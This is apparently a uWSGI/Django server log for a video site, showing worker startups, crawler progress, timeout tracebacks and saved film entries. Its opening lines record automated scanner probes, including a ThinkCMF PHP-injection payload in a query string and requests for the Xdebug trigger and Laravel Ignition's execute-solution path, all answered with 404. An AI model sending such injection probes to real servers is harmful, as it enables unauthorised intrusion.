[pid: 233991|app: 0|req: 2200/11659] 45.155.205.27 () {36 vars in 654 bytes} [Mon Apr 26 22:11:09 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2712/11660] 45.155.205.27 () {34 vars in 557 bytes} [Mon Apr 26 22:11:09 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4591/11661] 45.155.205.27 () {34 vars in 514 bytes} [Mon Apr 26 22:11:10 2021] GET /console/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4592/11662] 45.155.205.27 () {38 vars in 637 bytes} [Mon Apr 26 22:11:10 2021] POST /Autodiscover/Autodiscover.xml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2201/11663] 45.155.205.27 () {36 vars in 603 bytes} [Mon Apr 26 22:11:10 2021] GET /_ignition/execute-solution => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2202/11664] 205.185.122.102 () {40 vars in 675 bytes} [Mon Apr 26 22:49:36 2021] GET /config/getuser?index=0 => generated 179 bytes in 10 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Apr 26 22:55:36 2021] ***
compiled with version: 9.3.0 on 03 January 2021 16:54:23
os: Linux-5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020
nodename: VM-8-16-ubuntu
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/git/django_project
writing pidfile to ./uwsgi.pid
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/ubuntu/git/django_project
your processes number limit is 7582
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 6
Python version: 3.8.5 (default, Jul 28 2020, 12:59:40)  [GCC 9.3.0]
Python main interpreter initialized at 0x555f39790aa0
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416720 bytes (406 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x555f39790aa0 pid: 1518657 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 1518657)
spawned uWSGI worker 1 (pid: 1518659, cores: 2)
spawned uWSGI worker 2 (pid: 1518660, cores: 2)
spawned uWSGI worker 3 (pid: 1518661, cores: 2)
spawned uWSGI worker 4 (pid: 1518662, cores: 2)
[pid: 1518662|app: 0|req: 1/1] 183.27.45.201 () {46 vars in 945 bytes} [Mon Apr 26 22:55:52 2021] GET /video/ => generated 64204 bytes in 476 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 1518659|app: 0|req: 1/2] 183.27.45.201 () {44 vars in 890 bytes} [Mon Apr 26 22:55:54 2021] GET /video/ => generated 64204 bytes in 400 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 1518659|app: 0|req: 2/3] 183.27.45.201 () {44 vars in 890 bytes} [Mon Apr 26 22:56:02 2021] GET /admin/ => generated 30384 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
--------2021-04-26 22:56:08 站点2开始更新--------
[pid: 1518662|app: 0|req: 2/4] 183.27.45.201 () {46 vars in 952 bytes} [Mon Apr 26 22:56:12 2021] GET /admin/view_log/ => generated 21819 bytes in 15 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 1518659|app: 0|req: 4/5] 183.27.45.201 () {46 vars in 974 bytes} [Mon Apr 26 22:56:15 2021] GET /admin/view_log/?page=1 => generated 21867 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 1518659|app: 0|req: 5/6] 183.27.45.201 () {46 vars in 921 bytes} [Mon Apr 26 22:56:22 2021] GET /video/ => generated 64204 bytes in 1055 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 1518660|app: 0|req: 1/7] 183.27.45.201 () {44 vars in 904 bytes} [Mon Apr 26 22:56:26 2021] GET /video/type/1/ => generated 34555 bytes in 1752 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 1518659|app: 0|req: 6/8] 183.27.45.201 () {46 vars in 981 bytes} [Mon Apr 26 22:56:41 2021] GET /admin/view_log/?page=1 => generated 22007 bytes in 19 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
获取到page: 100
[pid: 1518659|app: 0|req: 7/9] 183.27.45.201 () {46 vars in 981 bytes} [Mon Apr 26 22:57:02 2021] GET /admin/view_log/?page=1 => generated 22081 bytes in 18 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 1518659|app: 0|req: 8/10] 183.27.45.201 () {46 vars in 1000 bytes} [Mon Apr 26 22:57:27 2021] GET /video/type/1/?year=&area=&rating=5.0 => generated 40188 bytes in 375 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
page100保存成功
[pid: 1518659|app: 0|req: 9/11] 183.27.45.201 () {46 vars in 1023 bytes} [Mon Apr 26 22:57:36 2021] GET /video/type/1/?year=&area=&rating=5.0 => generated 40188 bytes in 331 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 1518659|app: 0|req: 10/12] 183.27.45.201 () {48 vars in 1054 bytes} [Mon Apr 26 22:57:48 2021] GET /video/type/1/?year=&area=&rating=5.0 => generated 40188 bytes in 341 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 1518659|app: 0|req: 11/13] 183.27.45.201 () {46 vars in 988 bytes} [Mon Apr 26 22:58:06 2021] GET /video/play/100772/ => generated 14364 bytes in 23 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 1518659|app: 0|req: 12/14] 183.27.45.201 () {46 vars in 978 bytes} [Mon Apr 26 22:58:30 2021] GET /video/type/1/ => generated 34017 bytes in 1049 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 1518659|app: 0|req: 13/15] 183.27.45.201 () {48 vars in 1012 bytes} [Mon Apr 26 22:58:42 2021] GET /admin/view_log/?page=1 => generated 22484 bytes in 19 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
已更新3000条数据
--------2021-04-26 22:59:58 站点2更新完成--------
[pid: 1518659|app: 0|req: 13/16] 183.27.45.201 () {46 vars in 908 bytes} [Mon Apr 26 22:56:08 2021] GET /admin/update/?url_index=2&type=count => generated 83 bytes in 230381 msecs (HTTP/1.1 200) 6 headers in 179 bytes (1 switches on core 0)
[pid: 1518659|app: 0|req: 14/17] 183.27.45.201 () {46 vars in 975 bytes} [Mon Apr 26 23:02:48 2021] GET /video/play/bajie272348/ => generated 13565 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Apr 26 23:05:18 2021] ***
compiled with version: 9.3.0 on 03 January 2021 16:54:23
os: Linux-5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020
nodename: VM-8-16-ubuntu
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/git/django_project
writing pidfile to ./uwsgi.pid
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/ubuntu/git/django_project
your processes number limit is 7582
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 6
Python version: 3.8.5 (default, Jul 28 2020, 12:59:40)  [GCC 9.3.0]
Python main interpreter initialized at 0x55838e8c4aa0
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416720 bytes (406 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55838e8c4aa0 pid: 1520378 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 1520378)
spawned uWSGI worker 1 (pid: 1520380, cores: 2)
spawned uWSGI worker 2 (pid: 1520381, cores: 2)
spawned uWSGI worker 3 (pid: 1520382, cores: 2)
spawned uWSGI worker 4 (pid: 1520383, cores: 2)
[pid: 1520383|app: 0|req: 1/1] 183.27.45.201 () {46 vars in 951 bytes} [Mon Apr 26 23:05:24 2021] GET /video/ => generated 64204 bytes in 410 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 1/2] 183.27.45.201 () {46 vars in 976 bytes} [Mon Apr 26 23:05:32 2021] GET /admin/update_video/ => generated 19539 bytes in 153 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
--------2021-04-26 23:05:34 站点2开始更新--------
一共2300页数据
获取到page: 2300
page2300保存成功
[pid: 1520380|app: 0|req: 3/3] 183.27.45.201 () {44 vars in 1015 bytes} [Mon Apr 26 23:05:46 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 23910 bytes in 842 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 1520383|app: 0|req: 2/4] 183.27.45.201 () {44 vars in 1015 bytes} [Mon Apr 26 23:05:46 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 23910 bytes in 814 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
获取到page: 2200
Exception in thread Thread-21:
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 360, in _error_catcher
    yield
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 666, in read_chunked
    self._update_chunk_length()
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 598, in _update_chunk_length
    line = self._fp.fp.readline()
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
socket.timeout: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 750, in generate
    for chunk in self.raw.stream(chunk_size, decode_content=True):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 490, in stream
    for line in self.read_chunked(amt, decode_content=decode_content):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 694, in read_chunked
    self._original_response.close()
  File "/usr/lib/python3.8/contextlib.py", line 131, in __exit__
    self.gen.throw(type, value, traceback)
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 365, in _error_catcher
    raise ReadTimeoutError(self._pool, None, 'Read timed out.')
urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='cj.bajiecaiji.com', port=80): Read timed out.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "./video/func/getRequest.py", line 96, in get_json
    response = requests.get(
  File "/usr/local/lib/python3.8/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/api.py", line 60, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/sessions.py", line 686, in send
    r.content
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 828, in content
    self._content = b''.join(self.iter_content(CONTENT_CHUNK_SIZE)) or b''
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 757, in generate
    raise ConnectionError(e)
requests.exceptions.ConnectionError: HTTPConnectionPool(host='cj.bajiecaiji.com', port=80): Read timed out.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3.8/threading.py", line 932, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.8/threading.py", line 870, in run
    self._target(*self._args, **self._kwargs)
  File "./video/func/GetPageData.py", line 87, in wrapper
    func(obj)
  File "./video/func/GetPageData.py", line 154, in add_page_to_queue
    res_dict = self.parse_url(url)
  File "./video/func/GetPageData.py", line 107, in parse_url
    return getRequest.get_json(url)
  File "./video/func/getRequest.py", line 113, in get_json
    print('爬虫网站%s 请求错误%s' % (url))
TypeError: not enough arguments for format string
Exception in thread Thread-29:
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 360, in _error_catcher
    yield
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 666, in read_chunked
    self._update_chunk_length()
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 598, in _update_chunk_length
    line = self._fp.fp.readline()
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
socket.timeout: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 750, in generate
    for chunk in self.raw.stream(chunk_size, decode_content=True):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 490, in stream
    for line in self.read_chunked(amt, decode_content=decode_content):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 694, in read_chunked
    self._original_response.close()
  File "/usr/lib/python3.8/contextlib.py", line 131, in __exit__
    self.gen.throw(type, value, traceback)
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 365, in _error_catcher
    raise ReadTimeoutError(self._pool, None, 'Read timed out.')
urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='cj.bajiecaiji.com', port=80): Read timed out.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "./video/func/getRequest.py", line 96, in get_json
    response = requests.get(
  File "/usr/local/lib/python3.8/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/api.py", line 60, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/sessions.py", line 686, in send
    r.content
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 828, in content
    self._content = b''.join(self.iter_content(CONTENT_CHUNK_SIZE)) or b''
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 757, in generate
    raise ConnectionError(e)
requests.exceptions.ConnectionError: HTTPConnectionPool(host='cj.bajiecaiji.com', port=80): Read timed out.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3.8/threading.py", line 932, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.8/threading.py", line 870, in run
    self._target(*self._args, **self._kwargs)
  File "./video/func/GetPageData.py", line 87, in wrapper
    func(obj)
  File "./video/func/GetPageData.py", line 154, in add_page_to_queue
    res_dict = self.parse_url(url)
  File "./video/func/GetPageData.py", line 107, in parse_url
    return getRequest.get_json(url)
  File "./video/func/getRequest.py", line 113, in get_json
    print('爬虫网站%s 请求错误%s' % (url))
TypeError: not enough arguments for format string
[pid: 1520380|app: 0|req: 4/5] 183.27.45.201 () {46 vars in 1031 bytes} [Mon Apr 26 23:06:09 2021] GET /video/play/bajie277616/ => generated 13752 bytes in 83 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
获取到page: 2100
获取到page: 2000
获取到page: 1900
[pid: 1520380|app: 0|req: 5/6] 183.27.45.201 () {46 vars in 1031 bytes} [Mon Apr 26 23:07:00 2021] GET /video/play/bajie277112/ => generated 13863 bytes in 23 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
获取到page: 1800
获取到page: 1700
[pid: 1520380|app: 0|req: 6/7] 115.148.152.144 () {34 vars in 438 bytes} [Mon Apr 26 23:07:26 2021] GET / => generated 179 bytes in 6 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
获取到page: 1600
[pid: 1520380|app: 0|req: 7/8] 183.27.45.201 () {46 vars in 973 bytes} [Mon Apr 26 23:07:43 2021] GET /admin/update_video/ => generated 19539 bytes in 3 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 8/9] 183.27.45.201 () {46 vars in 973 bytes} [Mon Apr 26 23:07:48 2021] GET /admin/update_video/ => generated 19539 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 9/10] 183.27.45.201 () {46 vars in 969 bytes} [Mon Apr 26 23:07:50 2021] GET /admin/update_log/ => generated 21373 bytes in 12 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
获取到page: 1500
[pid: 1520380|app: 0|req: 10/11] 183.27.45.201 () {46 vars in 982 bytes} [Mon Apr 26 23:07:54 2021] GET /admin/update_log/?page=35 => generated 18064 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 11/12] 183.27.45.201 () {46 vars in 990 bytes} [Mon Apr 26 23:08:04 2021] GET /admin/update_log/?page=35 => generated 18064 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
获取到page: 1400
[pid: 1520380|app: 0|req: 12/13] 183.27.45.201 () {46 vars in 990 bytes} [Mon Apr 26 23:08:08 2021] GET /admin/update_log/?page=35 => generated 18064 bytes in 3 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 13/14] 183.27.45.201 () {46 vars in 975 bytes} [Mon Apr 26 23:08:10 2021] GET /admin/update_log/ => generated 21373 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 14/15] 183.27.45.201 () {46 vars in 963 bytes} [Mon Apr 26 23:08:12 2021] GET /admin/view_log/ => generated 22824 bytes in 156 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 15/16] 183.27.45.201 () {46 vars in 974 bytes} [Mon Apr 26 23:08:15 2021] GET /admin/view_log/?page=3 => generated 19837 bytes in 99 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
获取到page: 1300
Exception in thread Thread-13:
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 360, in _error_catcher
    yield
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 666, in read_chunked
    self._update_chunk_length()
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 598, in _update_chunk_length
    line = self._fp.fp.readline()
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
socket.timeout: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 750, in generate
    for chunk in self.raw.stream(chunk_size, decode_content=True):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 490, in stream
    for line in self.read_chunked(amt, decode_content=decode_content):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 694, in read_chunked
    self._original_response.close()
  File "/usr/lib/python3.8/contextlib.py", line 131, in __exit__
    self.gen.throw(type, value, traceback)
  File "/usr/local/lib/python3.8/dist-packages/urllib3/response.py", line 365, in _error_catcher
    raise ReadTimeoutError(self._pool, None, 'Read timed out.')
urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='cj.bajiecaiji.com', port=80): Read timed out.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "./video/func/getRequest.py", line 96, in get_json
    response = requests.get(
  File "/usr/local/lib/python3.8/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/api.py", line 60, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/sessions.py", line 686, in send
    r.content
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 828, in content
    self._content = b''.join(self.iter_content(CONTENT_CHUNK_SIZE)) or b''
  File "/usr/local/lib/python3.8/dist-packages/requests/models.py", line 757, in generate
    raise ConnectionError(e)
requests.exceptions.ConnectionError: HTTPConnectionPool(host='cj.bajiecaiji.com', port=80): Read timed out.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3.8/threading.py", line 932, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.8/threading.py", line 870, in run
    self._target(*self._args, **self._kwargs)
  File "./video/func/GetPageData.py", line 87, in wrapper
    func(obj)
  File "./video/func/GetPageData.py", line 154, in add_page_to_queue
    res_dict = self.parse_url(url)
  File "./video/func/GetPageData.py", line 107, in parse_url
    return getRequest.get_json(url)
  File "./video/func/getRequest.py", line 113, in get_json
    print('爬虫网站%s 请求错误%s' % (url))
TypeError: not enough arguments for format string
[pid: 1520380|app: 0|req: 16/17] 183.27.45.201 () {46 vars in 950 bytes} [Mon Apr 26 23:08:32 2021] GET /video/ => generated 64204 bytes in 3160 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
获取到page: 1200
[pid: 1520380|app: 0|req: 17/18] 183.27.45.201 () {44 vars in 904 bytes} [Mon Apr 26 23:08:41 2021] GET /video/type/1/ => generated 34536 bytes in 2791 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
page2200保存成功
[pid: 1520380|app: 0|req: 18/19] 183.27.45.201 () {46 vars in 955 bytes} [Mon Apr 26 23:08:50 2021] GET /video/type/2/ => generated 32437 bytes in 1871 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
获取到page: 1100
获取到page: 1000
获取到page: 900
获取到page: 800
获取到page: 700
获取到page: 600
获取到page: 500
获取到page: 400
获取到page: 300
获取到page: 200
获取到page: 100
page2100保存成功
page2000保存成功
page1900保存成功
page1800保存成功
page1700保存成功
page1600保存成功
[pid: 1520380|app: 0|req: 19/20] 113.70.128.224 () {34 vars in 472 bytes} [Mon Apr 26 23:26:53 2021] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 20/21] 113.70.128.224 () {34 vars in 472 bytes} [Mon Apr 26 23:26:53 2021] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
page1500保存成功
page1400保存成功
page1300保存成功
page1200保存成功
page1100保存成功
page1000保存成功
page900保存成功
[pid: 1520380|app: 0|req: 21/22] 183.27.45.201 () {46 vars in 981 bytes} [Mon Apr 26 23:48:02 2021] GET /admin/view_log/?page=3 => generated 22347 bytes in 77 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 22/23] 183.27.45.201 () {46 vars in 981 bytes} [Mon Apr 26 23:48:06 2021] GET /admin/view_log/?page=4 => generated 18936 bytes in 94 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 23/24] 183.27.45.201 () {46 vars in 981 bytes} [Mon Apr 26 23:48:14 2021] GET /admin/view_log/?page=4 => generated 18991 bytes in 88 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 24/25] 183.27.45.201 () {46 vars in 955 bytes} [Mon Apr 26 23:48:34 2021] GET /video/type/1/ => generated 34896 bytes in 3698 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 1520381|app: 0|req: 1/26] 183.27.45.201 () {46 vars in 955 bytes} [Mon Apr 26 23:48:37 2021] GET /video/type/1/ => generated 34896 bytes in 3743 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
page800保存成功
[pid: 1520381|app: 0|req: 2/27] 183.27.45.201 () {46 vars in 955 bytes} [Mon Apr 26 23:48:53 2021] GET /video/type/2/ => generated 32437 bytes in 2153 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 1520380|app: 0|req: 25/28] 183.27.45.201 () {46 vars in 955 bytes} [Mon Apr 26 23:48:54 2021] GET /video/type/2/ => generated 32437 bytes in 1971 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 1520380|app: 0|req: 26/29] 183.27.45.201 () {46 vars in 976 bytes} [Mon Apr 26 23:48:59 2021] GET /admin/update_video/ => generated 19539 bytes in 24 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
007别传之皇家夜总会 1294814 6.3 保存成功[douban_json]
007：幽灵党 11620560 6.2 保存成功[douban_json]
101真狗 1293135 7.3 保存成功[douban_json]
1995穿越时间 26328650 5.6 保存成功[douban_json]
page700保存成功
27套礼服 2132120 6.7 保存成功[douban_json]
2人三足 1306657 6.8 保存成功[douban_json]
3Agirl 2016.10.03 HD.091 黑色情网：比娜 26705642 6.8 保存成功[douban_json]
30次约会 3903389 5.2 保存成功[douban_json]
54俱乐部 1297761 6.6 保存成功[douban_json]
577计划 11523500 7.3 保存成功[douban_json]
60岁的情书 3562674 8.2 保存成功[douban_json]
6种死亡方式 25908598 5.4 保存成功[douban_json]
7级公务员 19971609 6.5 保存成功[douban_json]
92霸王花与霸王花 1917973 6.4 保存成功[douban_json]
page600保存成功
9号谋杀案 1308704 6.8 保存成功[douban_json]
A片现场不NG 26336519 6 保存成功[douban_json]
page500保存成功
[1619452801] logsize: 52992, triggering log-reopen...
